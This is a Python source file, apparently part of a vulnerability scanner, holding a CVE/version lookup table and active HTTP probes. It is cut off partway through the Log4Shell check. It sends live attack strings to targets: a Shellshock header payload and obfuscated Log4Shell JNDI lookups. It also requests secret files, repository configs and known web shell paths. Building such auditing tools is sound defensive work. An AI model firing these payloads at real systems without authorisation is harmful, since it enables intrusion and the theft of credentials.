"""
Deep Vulnerability Scanner — Active probing + CVE version mapping.

Covers:
  Phase 1 — CVE / version database (mysql, ftp, ssh, http, https, smtp,
             redis, mongo, postgres, mssql, docker, kubernetes)
  Phase 2 — Active HTTP/S probes  (only for http/https targets):
    • Server fingerprint & header leak
    • Security-header audit (HSTS, CSP, X-Frame-Options, X-Content-Type,
      Referrer-Policy, Permissions-Policy, COEP, COOP, CORP)
    • CORS misconfiguration (wildcard, reflect-origin)
    • HTTP methods audit (TRACE, TRACK, PUT, DELETE allowed)
    • Clickjacking check
    • Cookie security flags (Secure, HttpOnly, SameSite)
    • Directory listing detection
    • Sensitive path exposure (.git, .env, backup files, phpinfo, etc.)
    • Log4Shell / Spring4Shell / Shellshock / Struts active probes
    • PHP & server-specific misconfiguration checks
    • Path traversal active probe
    • Open redirect check
    • Reflected XSS quick probe
    • SSRF internal probe via URL params
    • Source-code disclosure (.git/HEAD, .svn/entries)
  Phase 3 — SSL/TLS deep audit (SSLv3/TLS1.0/1.1, weak ciphers,
             self-signed, expired, HSTS missing, OCSP stapling)
"""
import http.client
import re
import socket
import ssl
import time
from datetime import datetime, timezone
from urllib.parse import quote_plus

from rich.table import Table

from Design.colors_cli import console, escape
from modules.target import TargetInfo
from modules.attack_config import AttackConfig
from modules.attacks.progress import section, found, warn, fail, req_log


# ============================================================================
# CVE / VERSION DATABASE
# ============================================================================

def _clean_ver(v_str: str) -> tuple[int, ...]:
    m = re.search(r"(\d+(?:\.\d+)+)", v_str)
    if not m:
        return (0,)
    parts = []
    for x in m.group(1).split("."):
        try:
            parts.append(int(x))
        except ValueError:
            break
    return tuple(parts)


def _ver_cmp(v_str: str, op: str, target_ver: str) -> bool:
    v = _clean_ver(v_str)
    t = _clean_ver(target_ver)
    if not v or v == (0,):
        return False
    n = max(len(v), len(t))
    vp = v + (0,) * (n - len(v))
    tp = t + (0,) * (n - len(t))
    return {"<=": vp <= tp, "<": vp < tp, ">=": vp >= tp,
            ">":  vp > tp,  "==": vp == tp}.get(op, False)


def _ver_in_range(v: str, lo: str, hi: str) -> bool:
    return _ver_cmp(v, ">=", lo) and _ver_cmp(v, "<=", hi)


CVE_DB: dict[str, list[dict]] = {

    # ── MySQL ─────────────────────────────────────────────────────────────────
    "mysql": [
        {"cve": "CVE-2012-2122", "severity": "CRITICAL", "cvss": 9.8,
         "name": "MySQL Auth Bypass (memcmp)",
         "condition": lambda v: _ver_cmp(v, "<=", "5.5.23") or _ver_in_range(v, "5.1.0", "5.1.62"),
         "desc": "Memcmp flaw lets attackers bypass auth without a password (~1/256 per attempt)."},
        {"cve": "CVE-2016-6662", "severity": "CRITICAL", "cvss": 9.8,
         "name": "MySQL Remote Root RCE via config injection",
         "condition": lambda v: _ver_cmp(v, "<", "5.7.15") or _ver_cmp(v, "<", "5.6.33"),
         "desc": "my.cnf injection via general_log_file leads to root shell."},
        {"cve": "CVE-2016-6663", "severity": "HIGH", "cvss": 7.0,
         "name": "MySQL Privilege Escalation (race condition)",
         "condition": lambda v: _ver_cmp(v, "<", "5.7.15") or _ver_cmp(v, "<", "5.6.33"),
         "desc": "REPAIR TABLE race condition allows local privilege escalation."},
        {"cve": "CVE-2017-3599", "severity": "HIGH", "cvss": 7.5,
         "name": "MySQL Remote DoS / Pre-Auth Crash",
         "condition": lambda v: _ver_cmp(v, "<", "5.7.17") or _ver_cmp(v, "<", "5.6.35"),
         "desc": "Unauthenticated crash via crafted handshake packet."},
        {"cve": "CVE-2021-27928", "severity": "HIGH", "cvss": 7.2,
         "name": "MariaDB / MySQL wsrep provider RCE",
         "condition": lambda v: _ver_in_range(v, "10.1.0", "10.5.9"),
         "desc": "Authenticated attacker can execute OS commands via wsrep_provider."},
        {"cve": "MISCONFIG-MYSQL-OUTFILE", "severity": "MEDIUM", "cvss": 6.5,
         "name": "FILE privilege / secure_file_priv disabled",
         "condition": lambda v: True,
         "desc": "SELECT INTO OUTFILE may allow webshell drops if secure_file_priv=''."},
        {"cve": "MISCONFIG-MYSQL-REMOTE-ROOT", "severity": "HIGH", "cvss": 8.0,
         "name": "Remote root login enabled",
         "condition": lambda v: True,
         "desc": "Root account bound to '%' allows network-level brute force."},
    ],

    # ── FTP ───────────────────────────────────────────────────────────────────
    "ftp": [
        {"cve": "CVE-2011-2523", "severity": "CRITICAL", "cvss": 10.0,
         "name": "vsFTPd 2.3.4 Backdoor",
         "condition": lambda v: "2.3.4" in v,
         "desc": "':)' in username opens a root shell listener on port 6200."},
        {"cve": "CVE-2015-3306", "severity": "HIGH", "cvss": 10.0,
         "name": "ProFTPD mod_copy Unauthenticated RCE",
         "condition": lambda v: "proftpd" in v.lower() and _ver_cmp(v, "<=", "1.3.5"),
         "desc": "SITE CPFR/CPTO copies files anywhere on disk without authentication."},
        {"cve": "CVE-2010-4221", "severity": "CRITICAL", "cvss": 10.0,
         "name": "ProFTPD Telnet IAC Stack Overflow",
         "condition": lambda v: "proftpd" in v.lower() and _ver_cmp(v, "<=", "1.3.3c"),
         "desc": "Stack-based buffer overflow via IAC commands leads to RCE."},
        {"cve": "CVE-2019-12815", "severity": "CRITICAL", "cvss": 9.8,
         "name": "ProFTPD mod_copy Unauthenticated File Copy (bypass)",
         "condition": lambda v: "proftpd" in v.lower() and _ver_cmp(v, "<=", "1.3.6"),
         "desc": "mod_copy allows unauthenticated file copies when ALLOW FROM ALL is set."},
        {"cve": "MISCONFIG-FTP-ANON", "severity": "HIGH", "cvss": 7.5,
         "name": "Anonymous FTP Login Enabled",
         "condition": lambda v: False,
         "desc": "FTP server accepts anonymous / no-password logins."},
        {"cve": "MISCONFIG-FTP-WRITEABLE", "severity": "HIGH", "cvss": 7.0,
         "name": "Writable FTP Root Directory",
         "condition": lambda v: False,
         "desc": "Anonymous or authenticated users can upload arbitrary files."},
    ],

    # ── SSH ───────────────────────────────────────────────────────────────────
    "ssh": [
        {"cve": "CVE-2024-6387", "severity": "CRITICAL", "cvss": 8.1,
         "name": "regreSSHion — OpenSSH Pre-Auth RCE",
         "condition": lambda v: _ver_in_range(v, "8.5p1", "9.7p1"),
         "desc": "Signal handler race in sshd allows unauthenticated RCE on glibc systems."},
        {"cve": "CVE-2023-38408", "severity": "CRITICAL", "cvss": 9.8,
         "name": "OpenSSH ssh-agent Remote Code Execution",
         "condition": lambda v: _ver_cmp(v, "<", "9.3p2"),
         "desc": "Malicious SSH server can RCE via forwarded ssh-agent and PKCS#11 libraries."},
        {"cve": "CVE-2018-15473", "severity": "MEDIUM", "cvss": 5.3,
         "name": "OpenSSH Username Enumeration",
         "condition": lambda v: _ver_cmp(v, "<", "7.7"),
         "desc": "Timing difference in auth responses reveals valid usernames."},
        {"cve": "CVE-2016-10009", "severity": "HIGH", "cvss": 7.3,
         "name": "OpenSSH Agent Forwarding Arbitrary Code Execution",
         "condition": lambda v: _ver_cmp(v, "<", "7.4"),
         "desc": "Malicious agent can load remote PKCS#11 modules."},
        {"cve": "CVE-2016-6210", "severity": "MEDIUM", "cvss": 5.9,
         "name": "OpenSSH Username Enumeration via USERAUTH_REQUEST timing",
         "condition": lambda v: _ver_cmp(v, "<", "7.3"),
         "desc": "bcrypt delay on valid usernames distinguishes valid vs invalid users."},
        {"cve": "MISCONFIG-SSH-V1", "severity": "CRITICAL", "cvss": 9.1,
         "name": "SSHv1 Protocol Supported",
         "condition": lambda v: "SSH-1." in v,
         "desc": "SSH protocol version 1 has fundamental cryptographic weaknesses."},
        {"cve": "MISCONFIG-SSH-WEAK-ALGO", "severity": "MEDIUM", "cvss": 5.9,
         "name": "Weak Key Exchange / Cipher Algorithms",
         "condition": lambda v: _ver_cmp(v, "<", "8.0"),
         "desc": "Older OpenSSH may negotiate diffie-hellman-group1 or arcfour ciphers."},
    ],

    # ── HTTP ──────────────────────────────────────────────────────────────────
    "http": [
        {"cve": "CVE-2021-41773", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Apache 2.4.49 Path Traversal + RCE",
         "condition": lambda v: "2.4.49" in v,
         "desc": "/../ path traversal and mod_cgi RCE via specially crafted requests."},
        {"cve": "CVE-2021-42013", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Apache 2.4.50 Path Traversal (incomplete patch)",
         "condition": lambda v: "2.4.50" in v,
         "desc": "Double URL-encoding bypasses the 2.4.49 patch, re-enabling RCE."},
        {"cve": "CVE-2017-7679", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Apache mod_mime Buffer Overread",
         "condition": lambda v: _ver_cmp(v, "<", "2.2.33") or _ver_cmp(v, "<", "2.4.26"),
         "desc": "mod_mime one-byte overread in ap_find_token leads to memory disclosure."},
        {"cve": "CVE-2022-31813", "severity": "HIGH", "cvss": 9.1,
         "name": "Apache mod_proxy X-Forwarded-For Header Smuggling",
         "condition": lambda v: _ver_cmp(v, "<", "2.4.55"),
         "desc": "Hop-by-hop forwarding can bypass IP-based access controls."},
        {"cve": "CVE-2019-0211", "severity": "HIGH", "cvss": 7.8,
         "name": "Apache Local Privilege Escalation via MPM",
         "condition": lambda v: _ver_in_range(v, "2.4.17", "2.4.38"),
         "desc": "Child process can read/write parent memory, gaining root on graceful restart."},
        {"cve": "CVE-2014-6271", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Shellshock — Bash Remote Code Execution",
         "condition": lambda v: True,
         "desc": "CGI scripts pass attacker-controlled env vars to bash, enabling RCE."},
        {"cve": "CVE-2017-5638", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Apache Struts 2 RCE (Content-Type OGNL injection)",
         "condition": lambda v: True,
         "desc": "Jakarta Multipart parser OGNL injection enables unauthenticated RCE."},
        {"cve": "CVE-2021-44228", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Log4Shell — Log4j2 JNDI RCE",
         "condition": lambda v: True,
         "desc": "JNDI lookup in log4j2 <= 2.14.1 allows unauthenticated remote code execution."},
        {"cve": "CVE-2022-22965", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Spring4Shell — Spring Framework RCE",
         "condition": lambda v: True,
         "desc": "ClassLoader manipulation via data binding leads to RCE on Tomcat deployments."},
        {"cve": "CVE-2019-11043", "severity": "CRITICAL", "cvss": 9.8,
         "name": "PHP-FPM Underflow RCE (nginx + php-fpm)",
         "condition": lambda v: True,
         "desc": "URL path with %0a causes env_path_info underflow, triggering RCE."},
        {"cve": "CVE-2020-11978", "severity": "HIGH", "cvss": 8.8,
         "name": "Apache Airflow Command Injection via Example DAGs",
         "condition": lambda v: True,
         "desc": "Example DAG with exposed parameters allows OS command injection."},
        {"cve": "CVE-2024-4577", "severity": "CRITICAL", "cvss": 9.8,
         "name": "PHP CGI Argument Injection (Windows)",
         "condition": lambda v: True,
         "desc": "Best-fit encoding bypass allows argument injection in PHP CGI mode."},
    ],

    # ── HTTPS ─────────────────────────────────────────────────────────────────
    "https": [
        {"cve": "CVE-2014-0160", "severity": "HIGH", "cvss": 7.5,
         "name": "Heartbleed — OpenSSL TLS Memory Disclosure",
         "condition": lambda v: "1.0.1" in v,
         "desc": "Up to 64KB of server memory leaked per heartbeat request."},
        {"cve": "CVE-2014-0224", "severity": "HIGH", "cvss": 7.4,
         "name": "OpenSSL CCS Injection (MITM)",
         "condition": lambda v: _ver_cmp(v, "<", "1.0.1h"),
         "desc": "Premature ChangeCipherSpec message allows MITM decryption."},
        {"cve": "CVE-2016-0800", "severity": "HIGH", "cvss": 5.9,
         "name": "DROWN — SSLv2 Cross-Protocol Attack",
         "condition": lambda v: True,
         "desc": "SSLv2 padding oracle allows decryption of TLS sessions."},
        {"cve": "CVE-2021-41773", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Apache 2.4.49 Path Traversal + RCE",
         "condition": lambda v: "2.4.49" in v,
         "desc": "Path traversal and RCE via mod_cgi on HTTPS vhost."},
        {"cve": "CVE-2021-44228", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Log4Shell — Log4j2 JNDI RCE",
         "condition": lambda v: True,
         "desc": "JNDI lookup in log4j2 <= 2.14.1 allows unauthenticated RCE."},
        {"cve": "CVE-2022-22965", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Spring4Shell — Spring Framework RCE",
         "condition": lambda v: True,
         "desc": "ClassLoader manipulation via data binding leads to RCE."},
    ],

    # ── SMTP ──────────────────────────────────────────────────────────────────
    "smtp": [
        {"cve": "CVE-2019-10149", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Exim RCE — The Return of the WIZard",
         "condition": lambda v: "exim" in v.lower() and _ver_in_range(v, "4.87", "4.91"),
         "desc": "Improper RCPT address validation allows unauthenticated RCE."},
        {"cve": "CVE-2020-28017", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Exim Integer Overflow RCE (21Nails)",
         "condition": lambda v: "exim" in v.lower() and _ver_cmp(v, "<", "4.94.2"),
         "desc": "receive_add_recipient integer overflow in receive.c leads to heap overflow."},
        {"cve": "CVE-2021-44228", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Log4Shell via SMTP banner/header",
         "condition": lambda v: True,
         "desc": "If Java mailer logs SMTP data via log4j2, JNDI in EHLO/headers triggers RCE."},
        {"cve": "MISCONFIG-SMTP-OPEN-RELAY", "severity": "HIGH", "cvss": 7.5,
         "name": "Open SMTP Relay",
         "condition": lambda v: False,
         "desc": "Server relays mail for arbitrary senders — usable for spam/phishing."},
        {"cve": "MISCONFIG-SMTP-VRFY", "severity": "MEDIUM", "cvss": 5.3,
         "name": "VRFY / EXPN User Enumeration Enabled",
         "condition": lambda v: False,
         "desc": "VRFY and EXPN commands leak valid email accounts."},
    ],

    # ── Redis ─────────────────────────────────────────────────────────────────
    "redis": [
        {"cve": "CVE-2022-0543", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Redis Lua Sandbox Escape (Debian/Ubuntu)",
         "condition": lambda v: _ver_cmp(v, "<", "6.2.6"),
         "desc": "Debian-patched Redis leaks the Lua package object enabling RCE."},
        {"cve": "CVE-2015-8080", "severity": "HIGH", "cvss": 7.5,
         "name": "Redis Integer Overflow in Lua",
         "condition": lambda v: _ver_cmp(v, "<", "3.0.6"),
         "desc": "Integer overflow in Lua scripting allows arbitrary writes."},
        {"cve": "MISCONFIG-REDIS-NOAUTH", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Redis No Authentication Required",
         "condition": lambda v: True,
         "desc": "Redis bound without requirepass allows unauthenticated full access."},
    ],

    # ── MongoDB ───────────────────────────────────────────────────────────────
    "mongodb": [
        {"cve": "CVE-2019-2389", "severity": "MEDIUM", "cvss": 6.5,
         "name": "MongoDB Incorrect scram-sha-256 auth bypass",
         "condition": lambda v: _ver_in_range(v, "4.0.0", "4.0.10"),
         "desc": "Authentication check can be bypassed in SCRAM-SHA-256 exchanges."},
        {"cve": "MISCONFIG-MONGO-NOAUTH", "severity": "CRITICAL", "cvss": 10.0,
         "name": "MongoDB Listening Without Authentication",
         "condition": lambda v: True,
         "desc": "MongoDB bound to 0.0.0.0 without --auth exposes all databases."},
    ],

    # ── PostgreSQL ────────────────────────────────────────────────────────────
    "postgres": [
        {"cve": "CVE-2019-9193", "severity": "HIGH", "cvss": 7.2,
         "name": "PostgreSQL COPY TO/FROM PROGRAM RCE",
         "condition": lambda v: _ver_cmp(v, ">=", "9.3"),
         "desc": "Superuser can execute OS commands via COPY ... PROGRAM."},
        {"cve": "CVE-2023-2454", "severity": "HIGH", "cvss": 7.2,
         "name": "PostgreSQL schema privilege escalation",
         "condition": lambda v: _ver_cmp(v, "<", "15.3"),
         "desc": "Non-privileged user can hijack search_path to escalate via trusted extensions."},
        {"cve": "MISCONFIG-PG-TRUST-AUTH", "severity": "CRITICAL", "cvss": 10.0,
         "name": "PostgreSQL trust authentication (no password)",
         "condition": lambda v: True,
         "desc": "pg_hba.conf uses 'trust' — connections succeed without any password."},
    ],

    # ── MSSQL ─────────────────────────────────────────────────────────────────
    "mssql": [
        {"cve": "CVE-2020-0618", "severity": "HIGH", "cvss": 8.8,
         "name": "SQL Server Reporting Services RCE",
         "condition": lambda v: True,
         "desc": "Deserialization in SSRS allows authenticated RCE."},
        {"cve": "MISCONFIG-MSSQL-SA-BLANK", "severity": "CRITICAL", "cvss": 10.0,
         "name": "MSSQL SA account with blank password",
         "condition": lambda v: True,
         "desc": "Default sa account has no password — full DBA access available."},
        {"cve": "MISCONFIG-MSSQL-XPCMD", "severity": "HIGH", "cvss": 8.0,
         "name": "xp_cmdshell enabled",
         "condition": lambda v: True,
         "desc": "xp_cmdshell lets SQL queries execute arbitrary OS commands."},
    ],

    # ── Docker ────────────────────────────────────────────────────────────────
    "docker": [
        {"cve": "CVE-2019-5736", "severity": "CRITICAL", "cvss": 8.6,
         "name": "runc Container Escape",
         "condition": lambda v: True,
         "desc": "Malicious container can overwrite host runc binary leading to host RCE."},
        {"cve": "MISCONFIG-DOCKER-UNAUTHAPI", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Docker API Exposed Without Auth",
         "condition": lambda v: True,
         "desc": "Unauthenticated Docker daemon API (:2375) allows full container management."},
    ],

    # ── Kubernetes ────────────────────────────────────────────────────────────
    "kubernetes": [
        {"cve": "CVE-2018-1002105", "severity": "CRITICAL", "cvss": 9.8,
         "name": "Kubernetes API Server Privilege Escalation",
         "condition": lambda v: _ver_cmp(v, "<", "1.13.0"),
         "desc": "Unauthenticated users can send arbitrary requests to backend servers."},
        {"cve": "MISCONFIG-KUBE-ANONAPI", "severity": "CRITICAL", "cvss": 10.0,
         "name": "Kubernetes Anonymous API Access Enabled",
         "condition": lambda v: True,
         "desc": "API server allows anonymous requests — secrets/pods enumerable without auth."},
    ],
}


# ============================================================================
# HTTP HELPERS
# ============================================================================

_UA = "Mozilla/5.0 (compatible; SecurityAudit/2.0)"


def _conn(host: str, port: int, tls: bool, timeout: int = 8) -> http.client.HTTPConnection:
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    return http.client.HTTPConnection(host, port, timeout=timeout)


def _req(host, port, tls, path, method="GET", headers=None, body=None, timeout=8):
    try:
        c = _conn(host, port, tls, timeout)
        hdrs = {"User-Agent": _UA, "Connection": "close", **(headers or {})}
        c.request(method, path, body=body, headers=hdrs)
        r = c.getresponse()
        data = r.read(1024 * 512)  # 512 KB cap
        out = {
            "status": r.status,
            "headers": {k.lower(): v for k, v in r.getheaders()},
            "body": data,
            "size": len(data),
            "reason": r.reason,
        }
        c.close()
        return out
    except Exception:
        return None


def _body_str(resp: dict | None, limit: int = 4096) -> str:
    if not resp:
        return ""
    return resp["body"][:limit].decode("utf-8", "replace").lower()


# ============================================================================
# PHASE 2 — ACTIVE HTTP PROBE MODULES
# ============================================================================

def _probe_server_fingerprint(host, port, tls, findings: list) -> dict:
    """Grab root response and extract Server / X-Powered-By leaks."""
    section("Server Fingerprint")
    resp = _req(host, port, tls, "/")
    info = {}
    if not resp:
        warn("No response from /")
        return info

    req_log("GET", "/", resp["status"], resp["size"])
    hdrs = resp["headers"]

    server = hdrs.get("server", "")
    powered = hdrs.get("x-powered-by", "")
    aspnet  = hdrs.get("x-aspnet-version", "")

    if server:
        console.print(f"  [muted]Server       :[/muted] [text]{escape(server)}[/text]")
        info["server"] = server
        if any(w in server.lower() for w in ["apache/2.4.49", "apache/2.4.50"]):
            findings.append({
                "cve": "CVE-2021-41773/42013", "severity": "CRITICAL", "cvss": 9.8,
                "name": "Vulnerable Apache version in Server header",
                "desc": f"Server header reveals {server} — known path traversal/RCE version.",
            })
    if powered:
        console.print(f"  [muted]X-Powered-By :[/muted] [text]{escape(powered)}[/text]")
        info["x_powered_by"] = powered
        findings.append({
            "cve": "INFO-DISCLOSURE-XPOWEREDBY", "severity": "LOW", "cvss": 2.0,
            "name": "X-Powered-By Header Leaks Technology Stack",
            "desc": f"X-Powered-By: {powered} — reveals backend technology to attackers.",
        })
    if aspnet:
        console.print(f"  [muted]X-AspNet-Ver :[/muted] [text]{escape(aspnet)}[/text]")
        findings.append({
            "cve": "INFO-DISCLOSURE-ASPNETVER", "severity": "LOW", "cvss": 2.0,
            "name": "ASP.NET Version Disclosure",
            "desc": f"X-AspNet-Version: {aspnet}",
        })
    return info


def _probe_security_headers(host, port, tls, findings: list):
    """Check for missing/weak security response headers."""
    section("Security Headers")
    resp = _req(host, port, tls, "/")
    if not resp:
        return
    hdrs = resp["headers"]

    checks = [
        ("strict-transport-security",  "HSTS Missing",           "HSTS not set — HTTP downgrade attacks possible.", "MEDIUM", 5.3),
        ("content-security-policy",    "CSP Missing",             "No Content-Security-Policy — XSS reflection allowed.", "MEDIUM", 5.4),
        ("x-frame-options",            "Clickjacking (X-Frame-Options Missing)", "Missing X-Frame-Options / frame-ancestors CSP.", "MEDIUM", 4.3),
        ("x-content-type-options",     "MIME Sniffing (X-Content-Type-Options)", "Missing nosniff — browsers may MIME-sniff responses.", "LOW", 3.7),
        ("referrer-policy",            "Referrer-Policy Missing", "URL data may leak to third-party sites.", "LOW", 3.1),
        ("permissions-policy",         "Permissions-Policy Missing", "Browser feature access not restricted.", "LOW", 2.0),
    ]

    for hdr, name, desc, severity, cvss in checks:
        if hdr not in hdrs:
            warn(f"{name}")
            findings.append({
                "cve": f"MISCONFIG-HEADER-{hdr.upper().replace('-','_')}",
                "severity": severity, "cvss": cvss,
                "name": name, "desc": desc,
            })
        else:
            # Extra weak-value checks
            val = hdrs[hdr].lower()
            if hdr == "x-frame-options" and val not in ("deny", "sameorigin"):
                warn(f"X-Frame-Options weak value: {hdrs[hdr]}")
            elif hdr == "strict-transport-security" and "max-age=0" in val:
                warn("HSTS max-age=0 (effectively disabled)")


def _probe_cors(host, port, tls, findings: list):
    """Test for CORS misconfigurations."""
    section("CORS Misconfiguration")
    # 1. Wildcard
    resp = _req(host, port, tls, "/", headers={"Origin": "https://evil.com"})
    if not resp:
        return
    acao = resp["headers"].get("access-control-allow-origin", "")
    acac = resp["headers"].get("access-control-allow-credentials", "")
    if acao == "*":
        warn("CORS wildcard (Access-Control-Allow-Origin: *)")
        findings.append({
            "cve": "MISCONFIG-CORS-WILDCARD", "severity": "MEDIUM", "cvss": 6.1,
            "name": "CORS Wildcard Origin",
            "desc": "Any origin can read responses — allows cross-site data theft if cookies excluded.",
        })
    elif acao == "https://evil.com":
        warn("CORS reflects arbitrary Origin!")
        crit = "acac" in acac.lower() and "true" in acac.lower()
        findings.append({
            "cve": "MISCONFIG-CORS-REFLECT-CREDS" if crit else "MISCONFIG-CORS-REFLECT",
            "severity": "HIGH" if crit else "MEDIUM", "cvss": 8.1 if crit else 6.5,
            "name": "CORS Reflects Arbitrary Origin" + (" + Credentials" if crit else ""),
            "desc": "Server reflects attacker origin" + (", allowing cross-site credentialed requests." if crit else "."),
        })
    else:
        fail("CORS appears safe", acao or "no ACAO header")


def _probe_http_methods(host, port, tls, findings: list):
    """Check for dangerous HTTP methods."""
    section("HTTP Methods Audit")
    dangerous = ["TRACE", "TRACK", "PUT", "DELETE", "CONNECT"]
    for method in dangerous:
        resp = _req(host, port, tls, "/", method=method)
        if resp and resp["status"] not in (405, 501, 400, 403):
            warn(f"{method} method allowed (status {resp['status']})")
            cve_id = "MISCONFIG-HTTP-TRACE" if method in ("TRACE", "TRACK") else f"MISCONFIG-HTTP-{method}"
            sev = "MEDIUM" if method in ("TRACE", "TRACK") else "HIGH"
            cvss = 5.4 if method in ("TRACE", "TRACK") else 7.5
            findings.append({
                "cve": cve_id, "severity": sev, "cvss": cvss,
                "name": f"HTTP {method} Method Enabled",
                "desc": f"Server accepts {method} requests — {'XST attack possible.' if method in ('TRACE','TRACK') else 'may allow file upload/delete.'}",
            })


def _probe_cookie_security(host, port, tls, findings: list):
    """Check Set-Cookie flags."""
    section("Cookie Security Flags")
    resp = _req(host, port, tls, "/")
    if not resp:
        return
    cookies = [v for k, v in resp["headers"].items() if k == "set-cookie"]
    if not cookies:
        # Try login path
        resp2 = _req(host, port, tls, "/login")
        if resp2:
            cookies = [v for k, v in resp2["headers"].items() if k == "set-cookie"]
    for cookie in cookies:
        c_low = cookie.lower()
        name = cookie.split("=")[0].strip()
        issues = []
        if "httponly" not in c_low:
            issues.append("missing HttpOnly")
        if "secure" not in c_low and tls:
            issues.append("missing Secure flag")
        if "samesite" not in c_low:
            issues.append("missing SameSite")
        if issues:
            warn(f"Cookie '{escape(name)}': {', '.join(issues)}")
            findings.append({
                "cve": "MISCONFIG-COOKIE-FLAGS", "severity": "MEDIUM", "cvss": 5.4,
                "name": f"Insecure Cookie: {name}",
                "desc": f"Cookie {name!r} has: {', '.join(issues)}.",
            })


def _probe_sensitive_paths(host, port, tls, findings: list):
    """Probe high-value sensitive paths — source control, configs, shells."""
    section("Sensitive Path Exposure")
    targets = [
        # Source control
        (".git/HEAD",         "CRIT", "Git repo HEAD exposed"),
        (".git/config",       "CRIT", "Git config exposed"),
        (".svn/entries",      "HIGH", "SVN repo entries exposed"),
        (".svn/wc.db",        "HIGH", "SVN working copy DB exposed"),
        (".hg/hgrc",          "HIGH", "Mercurial config exposed"),
        # Secrets
        (".env",              "CRIT", ".env file exposed (credentials)"),
        (".env.production",   "CRIT", ".env.production exposed"),
        (".env.local",        "HIGH", ".env.local exposed"),
        ("wp-config.php",     "CRIT", "WordPress config (DB credentials) exposed"),
        ("config.php",        "HIGH", "config.php exposed"),
        ("config.yml",        "HIGH", "YAML config exposed"),
        ("config.json",       "HIGH", "JSON config exposed"),
        ("credentials.json",  "CRIT", "Credentials JSON exposed"),
        ("secrets.json",      "CRIT", "Secrets JSON exposed"),
        # Debug / info
        ("phpinfo.php",       "HIGH", "phpinfo() exposes full server config"),
        ("info.php",          "HIGH", "phpinfo() variant exposed"),
        ("php.ini",           "HIGH", "php.ini exposed"),
        ("server-status",     "MEDIUM", "Apache mod_status exposed"),
        ("server-info",       "MEDIUM", "Apache mod_info exposed"),
        ("actuator",          "HIGH", "Spring Boot Actuator exposed"),
        ("actuator/env",      "CRIT", "Spring Actuator /env exposes all properties"),
        ("actuator/heapdump", "HIGH", "Spring Actuator heapdump exposed"),
        # Backups
        ("backup.zip",        "HIGH", "Site backup archive exposed"),
        ("backup.sql",        "CRIT", "SQL backup dump exposed"),
        ("db.sql",            "CRIT", "Database dump exposed"),
        ("dump.sql",          "CRIT", "SQL dump exposed"),
        # Shells / exploit residue
        ("shell.php",         "CRIT", "Web shell 'shell.php' found"),
        ("cmd.php",           "CRIT", "Web shell 'cmd.php' found"),
        ("c99.php",           "CRIT", "c99 web shell found"),
        ("r57.php",           "CRIT", "r57 web shell found"),
        # Logs
        ("error.log",         "HIGH", "error.log exposed"),
        ("access.log",        "HIGH", "access.log exposed"),
        ("debug.log",         "MEDIUM", "debug.log exposed"),
    ]
    for path, sev_short, label in targets:
        resp = _req(host, port, tls, f"/{path}", timeout=6)
        if resp and resp["status"] in (200, 206):
            found(f"[{sev_short}] {label}", f"/{path} → HTTP {resp['status']} ({resp['size']}b)")
            severity = {"CRIT": "CRITICAL", "HIGH": "HIGH", "MEDIUM": "MEDIUM"}.get(sev_short, "HIGH")
            findings.append({
                "cve": f"EXPOSURE-{path.replace('/', '_').replace('.', '_').upper()}",
                "severity": severity, "cvss": {"CRITICAL": 9.1, "HIGH": 7.5, "MEDIUM": 5.3}.get(severity, 7.5),
                "name": label,
                "desc": f"/{path} returned HTTP 200 — {label}.",
            })


def _probe_directory_listing(host, port, tls, findings: list):
    """Check if directory listing is enabled."""
    section("Directory Listing")
    for path in ("/uploads/", "/images/", "/files/", "/static/", "/backup/", "/logs/"):
        resp = _req(host, port, tls, path, timeout=6)
        if resp and resp["status"] == 200:
            body = _body_str(resp)
            if "index of" in body or "parent directory" in body:
                found("Directory Listing Enabled", path)
                findings.append({
                    "cve": "MISCONFIG-DIR-LISTING", "severity": "MEDIUM", "cvss": 5.3,
                    "name": f"Directory Listing Enabled at {path}",
                    "desc": f"Web server lists directory contents at {path}.",
                })


def _probe_shellshock(host, port, tls, findings: list):
    """Active Shellshock probe via CGI endpoints."""
    section("Shellshock (CVE-2014-6271) Active Probe")
    cgi_paths = ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/env.cgi", "/cgi-bin/printenv"]
    payload = "() { :;}; echo; echo SHELLSHOCKED"
    hdrs = {
        "User-Agent": payload,
        "Referer":    payload,
        "Cookie":     f"x={payload}",
    }
    for path in cgi_paths:
        resp = _req(host, port, tls, path, headers=hdrs, timeout=8)
        if resp and "shellshocked" in _body_str(resp):
            found("SHELLSHOCK CONFIRMED", path)
            findings.append({
                "cve": "CVE-2014-6271", "severity": "CRITICAL", "cvss": 10.0,
                "name": "Shellshock — Bash Remote Code Execution (CONFIRMED)",
                "desc": f"Active exploit confirmed at {path}. Echo response received.",
            })
            return
        elif resp and resp["status"] == 200:
            body = _body_str(resp)
            if "gateway" in body or "cgi" in body:
                warn(f"CGI endpoint exists at {path} — Shellshock not confirmed but possible")


def _probe_log4shell(host, port, tls, findings: list):
    """Inject Log4Shell JNDI payloads into common headers."""
    section("Log4Shell (CVE-2021-44228) Active Probe")
    # Use a DNS callback indicator (no external infra — just check for 500 error indicating parsing)
    jndi_payloads = [
        "${jndi:ldap://127.0.0.1:1389/a}",
        "${${lower:j}ndi:${lower:l}dap://127.0.0.1:1389/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}",
    ]
    inject_headers = ["User-Agent", "X-Forwarded-For", "X-Api-Version",
                      "X-Client-IP", "Referer", "Authorization", "Accept-Language"]
    hinted = False
    for pl in jndi_payloads[:1]:  # one payload, all headers
        for hdr in inject_headers:
            resp = _req(host, port, tls, "/", headers={hdr: pl}, timeout=6)
